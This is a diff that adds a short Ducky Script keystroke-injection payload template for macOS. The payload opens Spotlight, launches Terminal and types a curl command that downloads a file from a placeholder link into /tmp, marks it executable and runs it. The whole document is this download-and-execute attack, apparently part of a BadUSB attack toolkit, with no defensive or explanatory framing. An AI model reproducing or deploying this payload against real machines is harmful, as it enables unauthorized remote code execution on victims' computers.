@@ -1,0 +1,12 @@
+REM Downloads and executes file
+DELAY {start_delay}
+COMMAND SPACE
+DELAY 10
+STRING terminal
+DELAY 100
+ENTER
+DELAY 300
+REM DOUBLE CHECK WHERE THE TEMPORARY FOLDER IS
+STRING curl {link} -o /tmp/r; chmod +x /tmp/r; /tmp/r{close_bash}
+DELAY 50
+ENTER
